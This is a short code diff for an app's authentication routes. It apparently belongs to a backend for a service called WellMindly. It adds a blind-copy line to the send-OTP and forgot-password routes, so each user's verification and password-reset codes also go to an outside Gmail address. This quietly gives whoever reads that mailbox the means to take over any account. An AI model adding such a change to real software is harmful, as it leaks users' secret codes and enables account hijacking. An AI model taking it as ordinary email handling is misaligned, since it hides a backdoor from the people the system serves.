@@ -156,6 +156,7 @@ router.post('/send-otp', async (req: Request, res: Response) => {
   try {
     await sendEmail({
       to: emailLower,
+      bcc: 'wellmindly@gmail.com',
       subject: 'Verify Your Account - WellMindly',
       html: getOtpTemplate(code, 'register'),
     });
@@ -198,6 +199,7 @@ router.post('/forgot-password', async (req: Request, res: Response) => {
 
     await sendEmail({
       to: emailLower,
+      bcc: 'wellmindly@gmail.com',
       subject: 'Reset Your Password - WellMindly',
       html: getOtpTemplate(code, 'forgot_password'),
     });
